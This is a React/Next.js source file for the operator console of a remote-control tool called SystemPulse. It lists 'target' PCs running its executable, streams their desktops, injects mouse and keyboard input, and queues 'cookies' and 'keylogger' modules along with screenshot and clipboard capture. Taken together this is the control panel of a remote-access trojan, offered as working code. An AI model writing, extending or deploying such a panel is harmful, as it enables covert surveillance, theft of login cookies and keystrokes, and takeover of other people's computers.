"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import Link from "next/link";
import { MODULE_CATALOG } from "@/lib/modules";

type OnlineHost = {
  hostname: string;
  username: string;
  screen_width?: number;
  screen_height?: number;
};

type AvEvent = {
  id: number;
  module: string;
  payload: Record<string, unknown> | null;
  created_at: string;
};

const FRAME_POLL_MS = 33;
const DEFAULT_INTERVAL = 1 / 30;
const WHEEL_DELTA = 120;
const ZOOM_MIN = 1;
const ZOOM_MAX = 4;
const ZOOM_STEP = 0.2;

const QUALITY_PRESETS = [
  { id: "ultra", label: "Ultra 30fps", hint: "~480p · target 30fps", interval: 1 / 30 },
  { id: "speed", label: "Speed", hint: "~640p · ~15fps", interval: 0.08 },
  { id: "balanced", label: "Balanced", hint: "~960p", interval: 0.12 },
  { id: "hd", label: "HD", hint: "~1280p", interval: 0.18 },
  { id: "full", label: "Full", hint: "~1920p · sharpest", interval: 0.28 },
] as const;

type QualityPreset = (typeof QUALITY_PRESETS)[number]["id"];

function normalizeRemoteKey(key: string): string {
  const k = key.toLowerCase();
  const map: Record<string, string> = {
    arrowup: "up",
    arrowdown: "down",
    arrowleft: "left",
    arrowright: "right",
    " ": "space",
    control: "ctrl",
    meta: "win",
  };
  return map[k] || k;
}

function payloadFromKeyboardEvent(e: KeyboardEvent): Record<string, unknown> | null {
  const key = e.key;
  if (key === "Shift" || key === "Control" || key === "Alt" || key === "Meta") {
    const solo =
      key === "Shift" ? "shift" : key === "Control" ? "ctrl" : key === "Alt" ? "alt" : "win";
    return { action: "key", key: solo };
  }

  const mods: string[] = [];
  if (e.ctrlKey) mods.push("ctrl");
  if (e.altKey) mods.push("alt");
  if (e.shiftKey) mods.push("shift");
  if (e.metaKey) mods.push("win");

  const main = normalizeRemoteKey(key);
  if (mods.length) {
    if (main.length === 1) return { action: "combo", keys: [...mods, main] };
    if (main.startsWith("f") && main.length <= 3) return { action: "combo", keys: [...mods, main] };
    if (["enter", "tab", "esc", "escape", "backspace", "delete", "home", "end"].includes(main)) {
      return { action: "combo", keys: [...mods, main] };
    }
    return null;
  }

  if (main.length === 1) return { action: "key", key: main };
  const specials = new Set([
    "enter",
    "tab",
    "esc",
    "escape",
    "space",
    "backspace",
    "delete",
    "home",
    "end",
    "pageup",
    "pagedown",
    "up",
    "down",
    "left",
    "right",
    "win",
    "insert",
    "pause",
    "capslock",
  ]);
  if (specials.has(main) || /^f\d{1,2}$/.test(main)) {
    return { action: "key", key: main === "escape" ? "esc" : main };
  }
  return { action: "type", text: key };
}

function controlHeaders(pin: string): HeadersInit {
  const h: Record<string, string> = { "Content-Type": "application/json" };
  if (pin) h["x-control-pin"] = pin;
  return h;
}

async function controlFetch(
  path: string,
  pin: string,
  options: RequestInit = {},
): Promise<Response> {
  return fetch(path, {
    ...options,
    headers: { ...controlHeaders(pin), ...(options.headers as Record<string, string>) },
  });
}

export default function ControlPage() {
  const [pin, setPin] = useState("");
  const [pinOk, setPinOk] = useState(false);
  const [hosts, setHosts] = useState<OnlineHost[]>([]);
  const [selected, setSelected] = useState<string>("");
  const [liveOn, setLiveOn] = useState(false);
  const [intervalSec, setIntervalSec] = useState(DEFAULT_INTERVAL);
  const [qualityPreset, setQualityPreset] = useState<QualityPreset>("ultra");
  const [hasFrame, setHasFrame] = useState(false);
  const [streamSize, setStreamSize] = useState("");
  const [zoom, setZoom] = useState(1);
  const [text, setText] = useState("");
  const [status, setStatus] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [fps, setFps] = useState(0);
  const [keysLive, setKeysLive] = useState(true);
  const imgRef = useRef<HTMLImageElement>(null);
  const liveWrapRef = useRef<HTMLDivElement>(null);
  const viewportRef = useRef<HTMLDivElement>(null);
  const lastFrameId = useRef(0);
  const hasFrameRef = useRef(false);
  const fpsCounter = useRef({ n: 0, t: Date.now() });

  const host = useMemo(
    () => hosts.find((h) => h.hostname === selected),
    [hosts, selected],
  );

  const screenW = Number(host?.screen_width || 1920);
  const screenH = Number(host?.screen_height || 1080);

  const liveBody = useCallback(
    (enabled: boolean) => ({
      hostname: selected,
      enabled,
      interval: intervalSec,
      quality: qualityPreset,
    }),
    [selected, intervalSec, qualityPreset],
  );

  useEffect(() => {
    const saved = sessionStorage.getItem("sp-control-pin") || "";
    if (saved) {
      setPin(saved);
      setPinOk(true);
    }
  }, []);

  const refreshOnline = useCallback(async () => {
    if (!pinOk) return;
    try {
      const res = await controlFetch("/api/control/online", pin);
      if (!res.ok) {
        const body = await res.json().catch(() => ({}));
        throw new Error(
          typeof body.error === "string" ? body.error : `HTTP ${res.status}`,
        );
      }
      const data = await res.json();
      setHosts(data.hosts || []);
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to load online hosts");
    }
  }, [pin, pinOk]);

  const refreshFrame = useCallback(async () => {
    if (!pinOk || !selected) return;
    try {
      const since = lastFrameId.current > 0 ? `&since_id=${lastFrameId.current}` : "";
      const res = await controlFetch(
        `/api/control/frame?hostname=${encodeURIComponent(selected)}${since}`,
        pin,
      );
      if (!res.ok) return;
      const data = await res.json();
      const event = data.event as AvEvent | null;
      if (!event?.payload?.image_base64) return;
      const b64 = event.payload.image_base64;
      if (typeof b64 !== "string") return;
      const fmt = event.payload.image_format === "jpeg" ? "jpeg" : "png";
      const src = `data:image/${fmt};base64,${b64}`;
      if (imgRef.current) {
        imgRef.current.src = src;
      }
      lastFrameId.current = event.id;
      if (!hasFrameRef.current) {
        hasFrameRef.current = true;
        setHasFrame(true);
      }
      const fw = event.payload.width;
      const fh = event.payload.height;
      if (typeof fw === "number" && typeof fh === "number") {
        setStreamSize(`${fw}×${fh}`);
      }
      fpsCounter.current.n += 1;
      const now = Date.now();
      if (now - fpsCounter.current.t >= 1000) {
        setFps(fpsCounter.current.n);
        fpsCounter.current = { n: 0, t: now };
      }
    } catch {
      /* ignore */
    }
  }, [pinOk, selected, pin]);

  useEffect(() => {
    if (!pinOk) return;
    refreshOnline();
    const t = setInterval(refreshOnline, 3000);
    return () => clearInterval(t);
  }, [pinOk, refreshOnline]);

  useEffect(() => {
    if (!pinOk || !selected || !liveOn) return;
    let alive = true;
    const pump = async () => {
      while (alive) {
        const t0 = performance.now();
        await refreshFrame();
        const wait = Math.max(0, FRAME_POLL_MS - (performance.now() - t0));
        await new Promise((r) => setTimeout(r, wait));
      }
    };
    void pump();
    return () => {
      alive = false;
    };
  }, [pinOk, selected, liveOn, refreshFrame]);

  function queueInput(payload: Record<string, unknown>) {
    if (!selected) return;
    void controlFetch("/api/control/command", pin, {
      method: "POST",
      body: JSON.stringify({ hostname: selected, kind: "input", payload }),
    })
      .then((res) => {
        if (!res.ok) setStatus("Input queue failed");
      })
      .catch(() => setStatus("Input queue failed"));
  }

  function sendCombo(keys: string[]) {
    queueInput({ action: "combo", keys });
    setStatus(`Sent ${keys.join("+")}`);
  }

  function runModule(module: string) {
    if (!selected) return;
    void controlFetch("/api/control/command", pin, {
      method: "POST",
      body: JSON.stringify({ hostname: selected, kind: "module", module }),
    });
    setStatus(`Queued ${module}`);
  }

  async function pushLiveSettings(enabled: boolean) {
    if (!selected) return false;
    const res = await controlFetch("/api/control/liveview", pin, {
      method: "PUT",
      body: JSON.stringify(liveBody(enabled)),
    });
    return res.ok;
  }

  async function toggleLive(enabled: boolean) {
    if (!selected) return;
    const ok = await pushLiveSettings(enabled);
    if (!ok) {
      setStatus(`Live view failed`);
      return;
    }
    setLiveOn(enabled);
    if (enabled) {
      lastFrameId.current = 0;
      hasFrameRef.current = false;
      setHasFrame(false);
      setStreamSize("");
      fpsCounter.current = { n: 0, t: Date.now() };
      void refreshFrame();
      const preset = QUALITY_PRESETS.find((p) => p.id === qualityPreset);
      setStatus(
        `Live ${preset?.label ?? qualityPreset} · ${intervalSec}s · poll ${FRAME_POLL_MS}ms`,
      );
    } else {
      setStatus("Live screen stopped");
      setFps(0);
    }
  }

  async function applyStreamSettings(next: {
    quality?: QualityPreset;
    interval?: number;
  }) {
    if (next.quality) {
      setQualityPreset(next.quality);
      const preset = QUALITY_PRESETS.find((p) => p.id === next.quality);
      if (preset && !liveOn) setIntervalSec(preset.interval);
    }
    if (next.interval !== undefined) setIntervalSec(next.interval);
    if (liveOn && selected) {
      const q = next.quality ?? qualityPreset;
      const iv = next.interval ?? intervalSec;
      const res = await controlFetch("/api/control/liveview", pin, {
        method: "PUT",
        body: JSON.stringify({
          hostname: selected,
          enabled: true,
          interval: iv,
          quality: q,
        }),
      });
      if (res.ok) setStatus(`Stream updated · ${q} · ${iv}s`);
    }
  }

  function clampZoom(value: number) {
    return Math.min(ZOOM_MAX, Math.max(ZOOM_MIN, Math.round(value * 10) / 10));
  }

  function onViewportWheel(ev: React.WheelEvent<HTMLDivElement>) {
    if (ev.ctrlKey || ev.metaKey) {
      ev.preventDefault();
      setZoom((z) => clampZoom(z + (ev.deltaY < 0 ? ZOOM_STEP : -ZOOM_STEP)));
    }
  }

  function screenCoords(ev: React.MouseEvent<HTMLElement>) {
    const img = imgRef.current;
    if (!img) return null;
    const rect = img.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return null;
    return {
      x: Math.round(((ev.clientX - rect.left) / rect.width) * screenW),
      y: Math.round(((ev.clientY - rect.top) / rect.height) * screenH),
    };
  }

  function onScreenClick(ev: React.MouseEvent<HTMLImageElement>) {
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    queueInput({ action: "click", x: pt.x, y: pt.y, button: "left", clicks: 1 });
  }

  function onScreenContextMenu(ev: React.MouseEvent<HTMLImageElement>) {
    ev.preventDefault();
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    queueInput({ action: "click", x: pt.x, y: pt.y, button: "right", clicks: 1 });
  }

  function onScreenDoubleClick(ev: React.MouseEvent<HTMLImageElement>) {
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    queueInput({ action: "click", x: pt.x, y: pt.y, button: "left", clicks: 2 });
  }

  function onScreenWheel(ev: React.WheelEvent<HTMLImageElement>) {
    if (ev.ctrlKey || ev.metaKey) {
      ev.preventDefault();
      setZoom((z) => clampZoom(z + (ev.deltaY < 0 ? ZOOM_STEP : -ZOOM_STEP)));
      return;
    }
    ev.preventDefault();
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    const horizontal = ev.shiftKey || Math.abs(ev.deltaX) > Math.abs(ev.deltaY);
    const raw = horizontal ? ev.deltaX : ev.deltaY;
    if (raw === 0) return;
    const lines = Math.max(1, Math.round(Math.abs(raw) / 40));
    const delta =
      (horizontal ? (raw > 0 ? 1 : -1) : raw < 0 ? 1 : -1) * WHEEL_DELTA * lines;
    queueInput({
      action: "scroll",
      x: pt.x,
      y: pt.y,
      delta,
      horizontal,
    });
  }

  function onLiveKeyDown(ev: React.KeyboardEvent<HTMLDivElement>) {
    if (!keysLive || !selected) return;
    const target = ev.target as HTMLElement;
    if (target.tagName === "INPUT" || target.tagName === "TEXTAREA") return;

    const payload = payloadFromKeyboardEvent(ev.nativeEvent);
    if (!payload) return;
    ev.preventDefault();
    ev.stopPropagation();
    queueInput(payload);
  }

  function sendText() {
    if (!text.trim()) return;
    queueInput({ action: "type", text });
    setText("");
  }

  function tryPin() {
    sessionStorage.setItem("sp-control-pin", pin);
    setPinOk(true);
  }

  const preview = hasFrame;

  if (!pinOk) {
    return (
      <div className="shell control-shell">
        <div className="control-gate">
          <h1>Remote control</h1>
          <p>Optional PIN if set as <code>CONTROL_PIN</code> on Vercel.</p>
          <input
            className="control-input"
            type="password"
            placeholder="Control PIN (optional)"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && tryPin()}
          />
          <button className="btn btn-accent" onClick={tryPin}>
            Continue
          </button>
          <Link href="/" className="control-back">
            ← Dashboard
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="shell control-shell">
      <header className="topbar">
        <div className="brand-text">
          <h1>
            System<span>Pulse</span> Control
          </h1>
          <p>Ultra 30fps mode · zoom · resolution presets</p>
        </div>
        <div className="topbar-right">
          {liveOn && fps > 0 && <span className="fps-pill">{fps} fps</span>}
          <Link href="/" className="btn">
            Dashboard
          </Link>
          <button
            className="btn"
            type="button"
            onClick={async () => {
              await fetch("/api/auth/logout", { method: "POST" });
              window.location.href = "/login";
            }}
          >
            Log out
          </button>
          <button className="btn btn-accent" onClick={refreshOnline}>
            Refresh online
          </button>
        </div>
      </header>

      {error && <div className="alert">{error}</div>}
      {status && <div className="control-status">{status}</div>}

      <div className="control-grid">
        <section className="panel control-panel">
          <div className="panel-title">Online PCs</div>
          {hosts.length === 0 ? (
            <p className="empty">No one online — open SystemPulse.exe on target PC.</p>
          ) : (
            <ul className="host-list">
              {hosts.map((h) => (
                <li key={h.hostname}>
                  <button
                    type="button"
                    className={`host-btn${selected === h.hostname ? " active" : ""}`}
                    onClick={() => {
                      setSelected(h.hostname);
                      setLiveOn(false);
                      hasFrameRef.current = false;
                      setHasFrame(false);
                      setStreamSize("");
                      setZoom(1);
                      lastFrameId.current = 0;
                    }}
                  >
                    <strong>{h.hostname}</strong>
                    <span>{h.username}</span>
                    {h.screen_width && h.screen_height && (
                      <span className="host-meta">
                        {h.screen_width}×{h.screen_height}
                      </span>
                    )}
                  </button>
                </li>
              ))}
            </ul>
          )}
        </section>

        <section className="panel control-panel control-main">
          <div className="panel-title">
            Live screen {selected ? `— ${selected}` : ""}
          </div>
          {!selected ? (
            <p className="empty">Select a PC from the list.</p>
          ) : (
            <>
              <div className="live-toolbar">
                <label>
                  Quality
                  <select
                    className="control-input"
                    value={qualityPreset}
                    onChange={(e) => {
                      const q = e.target.value as QualityPreset;
                      void applyStreamSettings({ quality: q });
                    }}
                  >
                    {QUALITY_PRESETS.map((p) => (
                      <option key={p.id} value={p.id}>
                        {p.label} — {p.hint}
                      </option>
                    ))}
                  </select>
                </label>
                <label>
                  Capture (s)
                  <input
                    type="number"
                    min={0.033}
                    max={15}
                    step={0.001}
                    value={Number(intervalSec.toFixed(3))}
                    onChange={(e) => setIntervalSec(Number(e.target.value))}
                    onBlur={() => void applyStreamSettings({ interval: intervalSec })}
                    className="control-input narrow"
                  />
                </label>
                <label>
                  Zoom
                  <input
                    type="range"
                    min={ZOOM_MIN}
                    max={ZOOM_MAX}
                    step={0.1}
                    value={zoom}
                    onChange={(e) => setZoom(Number(e.target.value))}
                    className="zoom-slider"
                  />
                  <span className="zoom-label">{Math.round(zoom * 100)}%</span>
                </label>
                <button type="button" className="btn btn-sm" onClick={() => setZoom(1)}>
                  Fit
                </button>
                {!liveOn ? (
                  <button className="btn btn-accent" onClick={() => toggleLive(true)}>
                    Start live
                  </button>
                ) : (
                  <button className="btn" onClick={() => toggleLive(false)}>
                    Stop
                  </button>
                )}
              </div>
              {streamSize && liveOn && (
                <p className="stream-meta">
                  Stream {streamSize} → desktop {screenW}×{screenH}
                  {fps > 0 && ` · ${fps} fps`}
                </p>
              )}
              <div
                ref={liveWrapRef}
                className={`live-frame-wrap${keysLive ? " live-focused" : ""}`}
                tabIndex={0}
                onKeyDown={onLiveKeyDown}
                onClick={() => liveWrapRef.current?.focus()}
              >
                <div
                  ref={viewportRef}
                  className="live-viewport"
                  onWheel={onViewportWheel}
                >
                  <div className="live-zoom-inner" style={{ width: `${zoom * 100}%` }}>
                    {preview ? (
                      // eslint-disable-next-line @next/next/no-img-element
                      <img
                        ref={imgRef}
                        alt="Live screen"
                        className="live-frame"
                        onClick={onScreenClick}
                        onContextMenu={onScreenContextMenu}
                        onDoubleClick={onScreenDoubleClick}
                        onWheel={onScreenWheel}
                        draggable={false}
                        title="Ctrl+wheel zoom · wheel scroll · click to control"
                      />
                    ) : (
                      <div className="live-placeholder">
                        {liveOn ? "Waiting for first frame…" : "Start live to see their desktop"}
                      </div>
                    )}
                  </div>
                </div>
              </div>
              <p className="control-hint">
                Ctrl+wheel or slider to zoom · scroll inside view to pan when zoomed · Quality
                changes capture resolution on their PC (rebuild latest exe).
              </p>

              <label className="keys-live-toggle">
                <input
                  type="checkbox"
                  checked={keysLive}
                  onChange={(e) => setKeysLive(e.target.checked)}
                />
                Send keys to their PC when live view is focused. Win / Alt shortcuts need the latest exe + Run as administrator.
              </label>

              <div className="key-quick">
                {(
                  [
                    ["Win", ["win"]],
                    ["Win+D", ["win", "d"]],
                    ["Win+E", ["win", "e"]],
                    ["Win+R", ["win", "r"]],
                    ["Alt+Tab", ["alt", "tab"]],
                    ["Ctrl+C", ["ctrl", "c"]],
                    ["Ctrl+V", ["ctrl", "v"]],
                    ["Ctrl+A", ["ctrl", "a"]],
                    ["Tab", ["tab"]],
                    ["Esc", ["esc"]],
                    ["↑", ["up"]],
                    ["↓", ["down"]],
                    ["←", ["left"]],
                    ["→", ["right"]],
                  ] as const
                ).map(([label, keys]) => (
                  <button
                    key={label}
                    type="button"
                    className="btn btn-sm"
                    onClick={() => sendCombo([...keys])}
                  >
                    {label}
                  </button>
                ))}
              </div>

              <div className="control-row">
                <input
                  className="control-input flex"
                  value={text}
                  onChange={(e) => setText(e.target.value)}
                  placeholder="Type on their PC — Enter to send"
                  onKeyDown={(e) => {
                    if (e.key === "Enter") {
                      e.preventDefault();
                      sendText();
                    }
                  }}
                />
                <button className="btn btn-accent" onClick={sendText}>
                  Send
                </button>
                <button className="btn" onClick={() => queueInput({ action: "key", key: "enter" })}>
                  Enter
                </button>
                <button className="btn" onClick={() => queueInput({ action: "key", key: "backspace" })}>
                  ⌫
                </button>
              </div>

              <div className="module-quick">
                {MODULE_CATALOG.filter((m) =>
                  ["screenshot", "clipboard", "cookies", "keylogger"].includes(m.id),
                ).map((m) => (
                  <button key={m.id} type="button" className="btn" onClick={() => runModule(m.id)}>
                    {m.label}
                  </button>
                ))}
              </div>
            </>
          )}
        </section>
      </div>
    </div>
  );
}
